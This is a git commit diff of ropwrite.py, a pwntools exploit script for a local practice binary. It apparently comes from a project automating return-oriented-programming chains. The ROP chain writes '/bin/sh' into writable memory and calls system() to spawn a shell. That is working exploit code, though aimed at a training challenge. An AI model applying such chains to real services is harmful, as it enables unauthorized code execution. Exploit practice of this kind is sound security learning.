0c2d4257e27f8e6a8671cec1b5b3b7b901f85ec2
condor0010 <condor0010@laptop>
2022-12-04 22:36:01 -0500

    rop is less shit now, need to finish wright primitive identificaiton

--- ropwrite.py
+++ ropwrite.py
@@ -1,45 +1,34 @@
+import Fart_ROP
 from pwn import *
+from analyze import *
 
 binary = './bins2/bin-ropwrite-5'
 context.terminal = ["tmux", "splitw", "-h"]
-e = context.binary = ELF(binary)
-r = ROP(e)
+
+anal = Analyze(binary)
+rop = Fart_ROP.ROP(anal)
+
+writeable_mem = anal.elf.sym['__data_start']
 
 gs = '''
 continue
-b *0x000000000040076d
 '''
+
 
 def start():
     if args.GDB:
-        return gdb.debug(e.path, gdbscript=gs)
+        return gdb.debug(anal.elf.path, gdbscript=gs)
     else:
-        return process(e.path)
+        return process(anal.elf.path)
 
-io = start()
-
-writeable_mem = e.sym['__data_start']
 
 
 chain = b''
 chain += b'A' * 88
 
+chain += rop.fill_reg('r8', writeable_mem)
 
-# 0x000000000040076d: pop r8; pop r10; ret;
-# 0x000000000040076e: pop rax; pop r10; ret;
-# 0x0000000000400779: mov qword ptr [r8], rax; pop r15; ret;
-# 0x0000000000400764: pop rdi; ret;
-# 0x000000000040078c: pop rsi; ret;
-
-
-
-chain += p64(0x000000000040076d) # pop r8; pop r10; ret;
-chain += p64(writeable_mem) # r8
-chain += p64(0) # r10
-
-chain += p64(0x000000000040076e) # pop rax; pop r10; ret;
-chain += b'/bin/sh\0' # rax
-chain += p64(0) # r10
+chain += rop.fill_reg('rax', '/bin/sh\0')
 
 chain += p64(0x0000000000400779) # mov qword ptr [r8], rax; pop r15; ret;
 chain += p64(0) # r15
@@ -48,10 +37,11 @@ chain += p64(0) # r15
 chain += p64(0x0000000000400764) # pop rdi; ret;
 chain += p64(writeable_mem) # rdi
 
-chain += p64(e.sym['_fini'])
+chain += p64(anal.elf.sym['_fini'])
 
 
-chain += p64(e.sym['system'])
+chain += p64(anal.elf.sym['system'])
 
+io = start()
 io.sendline(chain)
 io.interactive()
